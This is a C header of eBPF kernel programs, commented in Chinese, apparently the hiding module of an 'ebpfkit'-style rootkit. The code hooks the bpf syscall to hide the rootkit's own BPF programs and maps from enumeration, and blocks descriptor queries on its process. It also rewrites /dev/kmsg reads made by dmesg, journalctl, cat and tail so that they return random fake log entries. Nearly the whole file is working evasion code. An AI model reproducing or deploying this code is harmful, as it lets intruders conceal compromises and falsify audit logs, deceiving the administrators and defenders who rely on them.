/*
 *开发隐藏模块
 */
#ifndef __HIDE_H
#define __HIDE_H

#include "headervmlinux.h"

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "defs.h"
#include "../utils/strings.h"
#ifndef barrier_var
#define barrier_var(var) asm volatile("" : "=r"(var) : "0"(var))
#endif

// 在内核态定义，用户态通过 skeleton 直接修改
const volatile __u32 TARGET_PID = 0;

/**
 * is_audit_tool - 检查当前进程是否为需要欺骗的审计工具
 * 返回 1 表示是审计工具（显示假日志），0 表示是系统进程（显示真日志）
 */
static __always_inline int is_audit_tool() {
    char comm[TASK_COMM_LEN];
    // 务必先清零，防止垃圾数据干扰比较
    __builtin_memset(comm, 0, sizeof(comm)); 
    bpf_get_current_comm(&comm, sizeof(comm));

    // 检查 "dmesg"
    if (comm[0] == 'd' && comm[1] == 'm' && comm[2] == 'e' && 
        comm[3] == 's' && comm[4] == 'g' && comm[5] == '\0') {
        return 1;
    }

    // 检查 "journalctl"
    if (comm[0] == 'j' && comm[1] == 'o' && comm[2] == 'u' && comm[3] == 'r' && 
        comm[4] == 'n' && comm[5] == 'a' && comm[6] == 'l' && comm[7] == 'c' && 
        comm[8] == 't' && comm[9] == 'l' && comm[10] == '\0') {
        return 1;
    }

    // 检查 "cat"
    if (comm[0] == 'c' && comm[1] == 'a' && comm[2] == 't' && comm[3] == '\0') {
        return 1;
    }

    // 检查 "tail"
    if (comm[0] == 't' && comm[1] == 'a' && comm[2] == 'i' && comm[3] == 'l' && comm[4] == '\0') {
        return 1;
    }
    
    return 0;
}

SEC("tracepoint/syscalls/sys_enter_bpf")
int handle_bpf_enter(struct trace_event_raw_sys_enter *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32 pid = pid_tgid >> 32;

    if (pid == TARGET_PID) return 0;

    struct bpf_syscall_t bpf_ctx = {};
    
    // 正确提取方式：
    // ctx->args[0] 是真正的 bpf cmd (0, 1, 2...)
    // ctx->args[1] 是真正的 bpf_attr 指针
    bpf_ctx.cmd = (u32)ctx->args[0]; 
    bpf_ctx.buf = (void *)ctx->args[1];
    bpf_ctx.id = 0;

    bpf_map_update_elem(&bpf_cache, &pid_tgid, &bpf_ctx, BPF_ANY);

    // 调试打印
    bpf_printk("Hiding Debug: PID %u, Real Cmd %u, Buf %p", pid, bpf_ctx.cmd, bpf_ctx.buf);

    return 0;
}

//中间点：ID 捕获 (kallsyms_add & new_fd)
// 捕获 Program ID
SEC("kprobe/bpf_prog_kallsyms_add")
int BPF_KPROBE(kprobe_bpf_prog_kallsyms_add, struct bpf_prog *prog)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    
    // 从暂存区找回入口处保存的上下文
    struct bpf_syscall_t *bpf_ctx = bpf_map_lookup_elem(&bpf_cache, &pid_tgid);
    if (!bpf_ctx)
        return 0;

    // 利用 CO-RE 一步到位读取 ID：prog->aux->id
    // BPF_CORE_READ 会自动处理内核版本间 aux 和 id 字段可能的偏移变动
    u32 id = BPF_CORE_READ(prog, aux, id);

    // 将 ID 存回上下文，供最后的 kretprobe 使用
    bpf_ctx->id = id;

    // 调试日志（正式版可关闭）
    // bpf_printk("ebpfkit: captured prog id %d for pid %d\n", id, pid_tgid >> 32);
    
    return 0;
}

// 2. 捕获 Map ID
SEC("kprobe/bpf_map_new_fd")
int BPF_KPROBE(kprobe_bpf_map_new_fd, struct bpf_map *map)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    
    struct bpf_syscall_t *bpf_ctx = bpf_map_lookup_elem(&bpf_cache, &pid_tgid);
    if (!bpf_ctx)
        return 0;

    // 直接读取 map->id
    u32 id = BPF_CORE_READ(map, id);

    bpf_ctx->id = id;

    // bpf_printk("ebpfkit: captured map id %d for pid %d\n", id, pid_tgid >> 32);

    return 0;
}

static __always_inline int handle_bpf_exit(struct pt_regs *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32 pid = pid_tgid >> 32;

    // 从暂存区找回入口处保存的上下文
    struct bpf_syscall_t *bpf_ctx = bpf_map_lookup_elem(&bpf_cache, &pid_tgid);
    if (!bpf_ctx)
        return 0;

    u32 *next_id_val;
    struct bpf_get_next_id_t get_next_id;
    struct bpf_task_fd_query_t query;

    // 根据入口记录的 cmd 进行逻辑分发
    switch (bpf_ctx->cmd) {
        
        case BPF_PROG_GET_NEXT_ID:
        case BPF_MAP_GET_NEXT_ID: {
            // 读取用户态缓冲区中的 get_next_id 结构
            if (bpf_probe_read_user(&get_next_id, sizeof(get_next_id), bpf_ctx->buf) < 0)
                break;

            // 逻辑 A：如果正在查询的 start_id 是我们的对象，直接隐藏
            u32 *hide_map_ptr;
            if (bpf_ctx->cmd == BPF_PROG_GET_NEXT_ID)
                hide_map_ptr = bpf_map_lookup_elem(&bpf_programs, &get_next_id.start_id);
            else
                hide_map_ptr = bpf_map_lookup_elem(&bpf_maps, &get_next_id.start_id);

            if (hide_map_ptr) {
                u32 real_next_id = *hide_map_ptr;
                // 将用户态内存中的 next_id 覆盖为我们黑名单里的“下一个合法 ID”
                // 偏移量 +4 是因为 next_id 在结构体中的位置
                bpf_probe_write_user(((char*)bpf_ctx->buf) + 4, &real_next_id, sizeof(u32));
                if (*hide_map_ptr == 0xffffffff) {
                    bpf_override_return(ctx, -2); // ENOENT
                    goto cleanup;
                }
            }
            break;
        }

        case BPF_PROG_GET_FD_BY_ID:
        case BPF_MAP_GET_FD_BY_ID: {
            // 如果是 Rootkit 自己的进程在获取 FD，不拦截（自用逻辑）
            if (pid == TARGET_PID)
                break;

            if (bpf_probe_read_user(&get_next_id, sizeof(get_next_id), bpf_ctx->buf) < 0)
                break;

            u32 id_to_check = (bpf_ctx->cmd == BPF_PROG_GET_FD_BY_ID) ? get_next_id.prog_id : get_next_id.map_id;
            
            // 检查该 ID 是否在黑名单
            void *found = (bpf_ctx->cmd == BPF_PROG_GET_FD_BY_ID) ? 
                          bpf_map_lookup_elem(&bpf_programs, &id_to_check) : 
                          bpf_map_lookup_elem(&bpf_maps, &id_to_check);
            
            if (found) {
                // 试图直接通过 ID 访问我们的对象，返回“文件不存在”
                bpf_override_return(ctx, -2); // -ENOENT
                goto cleanup;
            }
            break;
        }

        case BPF_PROG_LOAD:
        case BPF_MAP_CREATE: {
            // 只在调用成功时更新黑名单
            long ret = PT_REGS_RC(ctx);
            if (ret < 0)
                break;

            u32 key = (bpf_ctx->cmd == BPF_PROG_LOAD) ? 0 : 1;
            next_id_val = bpf_map_lookup_elem(&bpf_next_id, &key);
            if (next_id_val && *next_id_val == 0xffffffff) {
                // 记录刚分配的 ID
                bpf_map_update_elem(&bpf_next_id, &key, &bpf_ctx->id, BPF_ANY);
            }
            break;
        }

        case BPF_TASK_FD_QUERY: {
            if (bpf_probe_read_user(&query, sizeof(query), bpf_ctx->buf) < 0)
                break;

            if (query.pid == TARGET_PID) {
                // 禁止查询 Rootkit 进程的文件描述符关联
                bpf_override_return(ctx, -2);
                goto cleanup;
            }
            break;
        }
    }

cleanup:
    // 清理暂存区，防止泄露
    bpf_map_delete_elem(&bpf_cache, &pid_tgid);
    return 0;
}
//退出处理，根据 bpf_cache 里的 cmd 进行分发处理
SEC("kretprobe/__x64_sys_bpf")
int BPF_KRETPROBE(kretprobe_sys_bpf) {
    return handle_bpf_exit(ctx);
}


//隐藏kmsg

static __always_inline void _kmsg_do_open_enter(struct trace_event_raw_sys_enter *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    
    if ((id >> 32) == TARGET_PID) return;

    char filename[16];
    __builtin_memset(filename, 0, sizeof(filename));
    bpf_probe_read_user_str(filename, sizeof(filename), (char *)ctx->args[1]);

    // 直接逐字节比较。
    // 这能彻底避免生成 .rodata 段、避免数组初始化的内存拷贝，
    // 同时完全不需要依赖编译器的循环展开优化。
    if (filename[0] != '/' || filename[1] != 'd' || filename[2] != 'e' || 
        filename[3] != 'v' || filename[4] != '/' || filename[5] != 'k' || 
        filename[6] != 'm' || filename[7] != 's' || filename[8] != 'g') {
        return; // 不匹配，直接提前退出
    }

    // 如果能运行到这里，说明字符串完美匹配 "/dev/kmsg"
    u32 val = 1;
    bpf_map_update_elem(&tmp_open_paths, &id, &val, BPF_ANY);
}

static __always_inline void _kmsg_do_open_exit(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    int fd = (int)ctx->ret;
    if (fd < 0) return;

    u32 *is_kmsg = bpf_map_lookup_elem(&tmp_open_paths, &id);
    if (is_kmsg) {
        // 构造复合键：使用当前进程的 TGID
        u64 compound_key = (id & 0xFFFFFFFF00000000ULL) | (u32)fd;
        u32 val = 1;
        bpf_map_update_elem(&kmsg_fds, &compound_key, &val, BPF_ANY);
        bpf_map_delete_elem(&tmp_open_paths, &id);
    }
}

// 2. 修改 read_enter
static __always_inline void _kmsg_do_read_enter(struct trace_event_raw_sys_enter *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    u32 fd = (u32)ctx->args[0];

    // 使用复合键进行精准查询
    u64 compound_key = (id & 0xFFFFFFFF00000000ULL) | fd;
    u32 *is_kmsg = bpf_map_lookup_elem(&kmsg_fds, &compound_key);
    
    if (!is_kmsg) return;
    
    if (!is_audit_tool()) return;

    struct kmsg_read_ctx_t read_ctx = {}; 
    read_ctx.buf = (void *)ctx->args[1];
    read_ctx.fd = fd;
    bpf_map_update_elem(&kmsg_read_cache, &id, &read_ctx, BPF_ANY);
}

static __always_inline void _kmsg_do_read_exit(struct trace_event_raw_sys_exit *ctx){
    __u64 id = bpf_get_current_pid_tgid();

    struct kmsg_read_ctx_t *read_ctx =
        bpf_map_lookup_elem(&kmsg_read_cache, &id);
    if (!read_ctx)
        return;

    long ret_len_signed = ctx->ret;

    if (ret_len_signed <= 0)
        goto cleanup;

    __u64 ret_len = (__u64)ret_len_signed;

    /* 随机选择假日志 */
    __u32 log_key = bpf_get_prandom_u32() % FAKE_KMSG_COUNT;

    struct kmsg_data_t *fake = bpf_map_lookup_elem(&fa_kmsgs, &log_key);
    if (!fake)
        goto cleanup;

    __u64 len = (__u64)fake->len;

    /* 拦住真实的越界数据 */
    if (len == 0) {
        goto cleanup;
    }
    if (len > 104) {
        len = 104;
    }

    /* 专门写给 Verifier 看的，LLVM 无法优化掉
     * 因为上面已经拦截了，此时真实的 len 必然处于 [1, 104] 之间。
     */
    
    // len 最小是 1，所以 x 最小是 0。
    __u64 x = len - 1; 
    
    // 用位与操作限制上限。对真实值无影响，但 Verifier 会确信 x <= 127
    x &= 0x7F;            
    
    // 强行设置二次上限。Verifier 会确信 x <= 103
    if (x > 103) {
        x = 103;          
    }
    
    // 关键点：加回 1。
    // Verifier 数学推导：x 最小是 0，加上 1，所以 safe_len 最小是 1！
    // Verifier 数学推导：x 最大是 103，加上 1，所以 safe_len 最大是 104！
    __u64 safe_len = x + 1; 

    char tmp_buf[104];
    __builtin_memset(tmp_buf, 0, sizeof(tmp_buf));

    bpf_probe_read_kernel(tmp_buf,
                          sizeof(tmp_buf),
                          fake->content);

    /* safe_len 在 Verifier 眼里是绝对安全的 [1, 104] 闭区间 */
    bpf_probe_write_user(read_ctx->buf,
                         tmp_buf,
                         safe_len);

cleanup:
    bpf_map_delete_elem(&kmsg_read_cache, &id);
}


SEC("tracepoint/syscalls/sys_enter_openat")
int kmsg_open_enter(struct trace_event_raw_sys_enter *ctx) {
    _kmsg_do_open_enter(ctx);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_openat")
int kmsg_open_exit(struct trace_event_raw_sys_exit *ctx) {
    _kmsg_do_open_exit(ctx);
    return 0;
}

SEC("tracepoint/syscalls/sys_enter_read")
int kmsg_read_enter(struct trace_event_raw_sys_enter *ctx) {
    _kmsg_do_read_enter(ctx);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_read")
int kmsg_read_exit(struct trace_event_raw_sys_exit *ctx) {
    _kmsg_do_read_exit(ctx);
    return 0;
}

#endif